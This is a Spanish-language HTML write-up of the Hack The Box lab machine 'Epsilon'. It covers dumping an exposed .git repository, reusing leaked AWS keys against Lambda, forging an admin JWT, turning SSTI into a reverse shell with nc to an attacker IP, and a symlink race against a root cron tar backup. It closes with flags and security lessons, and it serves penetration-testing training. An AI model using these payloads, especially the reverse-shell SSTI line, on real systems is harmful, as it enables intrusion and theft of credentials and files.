<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Writeup - Máquina Epsilon HTB</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .writeup-content {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: white;
            padding: 40px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .header .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        .badges {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .badge {
            background: rgba(255,255,255,0.2);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.9em;
            backdrop-filter: blur(10px);
        }
        
        .content {
            padding: 40px;
        }
        
        .section {
            margin-bottom: 40px;
            padding: 30px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 5px solid #667eea;
        }
        
        .section h2 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-bottom: 2px solid #e9ecef;
            padding-bottom: 10px;
        }
        
        .section h3 {
            color: #495057;
            margin: 25px 0 15px 0;
            font-size: 1.4em;
        }
        
        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            border-left: 4px solid #667eea;
        }
        
        .image-container {
            text-align: center;
            margin: 20px 0;
        }
        
        .image-container img {
            max-width: 100%;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border: 1px solid #dee2e6;
        }
        
        .image-caption {
            font-style: italic;
            color: #6c757d;
            margin-top: 8px;
            font-size: 0.9em;
        }
        
        .vulnerability-list {
            list-style: none;
            padding: 0;
        }
        
        .vulnerability-list li {
            background: white;
            margin: 10px 0;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #e74c3c;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .vulnerability-list li::before {
            content: "⚠️";
            margin-right: 10px;
            font-weight: bold;
        }
        
        .success-box {
            background: linear-gradient(135deg, #d4edda, #c3e6cb);
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #28a745;
        }
        
        .tip-box {
            background: linear-gradient(135deg, #fff3cd, #ffeaa7);
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #ffc107;
        }
        
        .flags {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .flag-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border: 2px solid #e9ecef;
        }
        
        .flag-card.user {
            border-top: 5px solid #3498db;
        }
        
        .flag-card.root {
            border-top: 5px solid #e74c3c;
        }
        
        .flag-card h3 {
            margin-bottom: 15px;
            color: #2c3e50;
        }
        
        .flag-code {
            background: #2d3748;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 1.1em;
            word-break: break-all;
        }
        
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2em;
            }
            
            .content {
                padding: 20px;
            }
            
            .section {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="writeup-content">
            <div class="header">
                <h1>Writeup - Máquina Epsilon HTB</h1>
                <div class="subtitle">De SSTI a Root: Comprometiendo Epsilon mediante Git Exposure y AWS Lambda</div>
                <div class="badges">
                    <div class="badge">Dificultad: Media</div>
                    <div class="badge">Sistema: Linux</div>
                    <div class="badge">Técnicas: Git Exposure, SSTI, JWT Bypass</div>
                </div>
            </div>
            
            <div class="content">
                <!-- Reconocimiento -->
                <div class="section">
                    <h2>🔍 Reconocimiento Inicial</h2>
                    
                    <h3>Escaneo de Puertos</h3>
                    <div class="code-block">
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.11.134
                    </div>
                    
                    <div class="image-container">
                        <!-- Aquí iría tu imagen -->
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Resultado del escaneo nmap
                        </div>
                        <div class="image-caption">Puertos 22 (SSH), 80 (HTTP) y 5000 (HTTP) abiertos</div>
                    </div>
                    
                    <div class="tip-box">
                        <strong>💡 Tip:</strong> El parámetro <code>--min-rate 5000</code> acelera el escaneo significativamente en entornos controlados como HTB.
                    </div>
                </div>

                <!-- Enumeración Web -->
                <div class="section">
                    <h2>🌐 Enumeración Web - Puerto 80</h2>
                    
                    <h3>Git Repository Expuesto</h3>
                    <p>Al acceder al puerto 80 obtenemos un error 403, pero descubrimos que el directorio <code>.git/</code> está expuesto.</p>
                    
                    <div class="code-block">
# Descargar el repositorio .git
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://10.10.11.134/.git/ ../../git_dump
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: GitDumper en acción
                        </div>
                    </div>
                    
                    <h3>Análisis del Código Fuente</h3>
                    <div class="code-block">
# Ver historial de commits
git log --oneline

# Analizar commit específico
git show 7cf92a7
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Historial de commits
                        </div>
                    </div>
                </div>

                <!-- Credenciales AWS -->
                <div class="section">
                    <h2>🔑 Credenciales AWS Encontradas</h2>
                    
                    <div class="code-block">
# En track_api_CR_148.py encontramos:
aws_access_key_id='AQLA5M37BDN6FJP76TDC'
aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
region_name='us-east-1'
endpoint_url='http://cloud.epsilong.htb'
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Credenciales AWS en el código
                        </div>
                    </div>
                    
                    <div class="success-box">
                        <strong>🎯 Hallazgo Crítico:</strong> Credenciales AWS hardcodeadas en el historial de Git.
                    </div>
                </div>

                <!-- AWS Lambda Enumeration -->
                <div class="section">
                    <h2>☁️ Enumeración AWS Lambda</h2>
                    
                    <h3>Configuración de AWS CLI</h3>
                    <div class="code-block">
# Instalar AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# Configurar credenciales
aws configure
                    </div>
                    
                    <h3>Enumerar Funciones Lambda</h3>
                    <div class="code-block">
aws lambda list-functions --endpoint-url http://cloud.epsilon.htb
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Función costume_shop_v1 encontrada
                        </div>
                    </div>
                    
                    <h3>Descargar Código de la Función</h3>
                    <div class="code-block">
aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb
wget "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code" -O lambda_code.zip
unzip lambda_code.zip
                    </div>
                </div>

                <!-- JWT Bypass -->
                <div class="section">
                    <h2>🎫 Bypass de Autenticación JWT</h2>
                    
                    <h3>Secret Key Encontrada</h3>
                    <div class="code-block">
# En lambda_function.py encontramos:
secret = 'RrXCv`mrNe!K!4+5`wYq'
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Secret key en el código Lambda
                        </div>
                    </div>
                    
                    <h3>Generar Token JWT</h3>
                    <div class="code-block">
import jwt

secret = 'RrXCv`mrNe!K!4+5`wYq'
token = jwt.encode({'username': 'admin'}, secret, algorithm='HS256')
print(f"Token: {token}")
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Token JWT generado
                        </div>
                    </div>
                    
                    <h3>Acceso como Administrador</h3>
                    <div class="code-block">
// En la consola del navegador
document.cookie = 'auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
                    </div>
                </div>

                <!-- SSTI Exploitation -->
                <div class="section">
                    <h2>💥 Explotación SSTI a RCE</h2>
                    
                    <h3>Verificar Vulnerabilidad SSTI</h3>
                    <div class="code-block">
curl -X POST http://10.10.11.134:5000/order \
  -H "Cookie: auth=TU_TOKEN_JWT" \
  --data-urlencode "costume={{7*7}}"
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Confirmación SSTI con "49"
                        </div>
                    </div>
                    
                    <h3>Reverse Shell via SSTI</h3>
                    <div class="code-block">
curl -X POST http://10.10.11.134:5000/order \
  -H "Cookie: auth=TU_TOKEN_JWT" \
  --data-urlencode "costume={{lipsum.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 443 >/tmp/f').read()}}"
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Shell obtenida
                        </div>
                    </div>
                    
                    <div class="success-box">
                        <strong>✅ Éxito:</strong> Hemos convertido un SSTI en ejecución remota de comandos (RCE).
                    </div>
                </div>

                <!-- Privilege Escalation -->
                <div class="section">
                    <h2>⬆️ Escalada de Privilegios</h2>
                    
                    <h3>Enumeración con pspy</h3>
                    <div class="code-block">
# Descargar y ejecutar pspy
./pspy64
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Cron job ejecutándose como root
                        </div>
                    </div>
                    
                    <h3>Script de Backup Vulnerable</h3>
                    <div class="code-block">
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
                    </div>
                    
                    <div class="tip-box">
                        <strong>🔍 Vulnerabilidad:</strong> El parámetro <code>-h</code> en tar sigue symlinks y archiva el CONTENIDO de los archivos a los que apuntan.
                    </div>
                    
                    <h3>Explotación con Symlinks</h3>
                    <div class="code-block">
cat > /tmp/exploit.sh << 'EOF'
#!/bin/bash
while true; do 
    if [ -e /opt/backups/checksum ]; then 
        rm -f /opt/backups/checksum
        ln -s -f /root/root.txt /opt/backups/checksum 
        echo "Symlink creado a /root/root.txt"
        break
    fi
    sleep 1
done
EOF

chmod +x /tmp/exploit.sh
./exploit.sh &
                    </div>
                    
                    <h3>Extraer Root Flag</h3>
                    <div class="code-block">
# Esperar y extraer
sleep 120
latest_backup=$(ls -t /var/backups/web_backups/ | head -1)
tar -xf "/var/backups/web_backups/$latest_backup" -O opt/backups/checksum
                    </div>
                    
                    <div class="image-container">
                        <div style="background: #f8f9fa; padding: 40px; border-radius: 8px; text-align: center;">
                            🖼️ Imagen: Root flag obtenida
                        </div>
                    </div>
                </div>

                <!-- Flags -->
                <div class="section">
                    <h2>🏴 Flags Obtenidas</h2>
                    
                    <div class="flags">
                        <div class="flag-card user">
                            <h3>User Flag</h3>
                            <div class="flag-code">e7b7a5a76e7c6a45b36a6f935d5cbd8a</div>
                        </div>
                        
                        <div class="flag-card root">
                            <h3>Root Flag</h3>
                            <div class="flag-code">f1c9b81c1242d7cdb758442165ee609d</div>
                        </div>
                    </div>
                </div>

                <!-- Conclusión -->
                <div class="section">
                    <h2>🏆 Conclusión</h2>
                    
                    <h3>Vulnerabilidades Explotadas</h3>
                    <ul class="vulnerability-list">
                        <li>Exposición de directorio .git/ en producción</li>
                        <li>Credenciales AWS hardcodeadas en el historial de commits</li>
                        <li>Secret_key JWT débil y reutilizada</li>
                        <li>Server-Side Template Injection (SSTI) en Flask</li>
                        <li>Parámetro -h inseguro en script de backup cron</li>
                    </ul>
                    
                    <h3>Lecciones de Seguridad</h3>
                    <div class="tip-box">
                        <ul>
                            <li>Nunca exponer directorios .git en entornos de producción</li>
                            <li>Usar git-secrets para prevenir commit de credenciales</li>
                            <li>Implementar gestión segura de secretos (Hashicorp Vault, AWS Secrets Manager)</li>
                            <li>Sanitizar todas las entradas de usuario, especialmente en render_template_string()</li>
                            <li>Validar y restringir parámetros en scripts automatizados</li>
                            <li>Rotar credenciales regularmente</li>
                        </ul>
                    </div>
                    
                    <div class="success-box">
                        <strong>🎯 Técnicas Dominadas:</strong> Git Dumping, AWS Lambda Enumeration, JWT Bypass, SSTI to RCE, Symlink Exploitation, Cron Job Abuse.
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
